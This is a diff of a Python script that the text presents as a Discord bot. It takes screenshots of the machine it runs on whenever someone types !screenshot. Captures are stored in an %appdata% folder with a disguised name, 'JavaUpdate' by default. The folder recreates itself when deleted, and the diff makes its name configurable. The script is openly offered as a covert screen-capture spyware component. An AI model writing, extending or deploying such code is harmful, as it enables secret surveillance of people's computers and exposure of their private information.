@@ -1,8 +1,9 @@
-#change the variable token to your discord bot token
-#type !screenshot in your discord server with the bot and see the magic XD
+#change the variable token to your discord bot token, also change directoryname. it is the name of the directory
+#that will be used in %appdata% to store temporary screenshots. It will automatic create itself when deleted.
+#type !screenshot in your discord server with the bot and see the magic
 #feel free to change the code as you want.
 token = "change me"
-
+directoryname = "JavaUpdate"
 
 #code
 
@@ -14,19 +15,19 @@ import pyautogui
 import os
 import time
 appdata = os.getenv("APPDATA")
-pathfld = rf"{appdata}\JavaUpdate"
-pathss = rf"{appdata}\JavaUpdate\screenshot.png"
+pathfld = rf"{appdata}\{directoryname}"
+pathss = rf"{appdata}\{directoryname}\screenshot.png"
 
 
 def screenshitting():
     if not os.path.exists(pathfld):
-        os.makedirs(f"{appdata}\JavaUpdate")
+        os.makedirs(f"{appdata}\{directoryname}")
         print(f"created new folder at {pathfld}")
 
 
     print (appdata)
     screenshot = pyautogui.screenshot()
-    screenshot.save(rf'{appdata}\JavaUpdate\screenshot.png')
+    screenshot.save(rf'{appdata}\{directoryname}\screenshot.png')
 
 
 
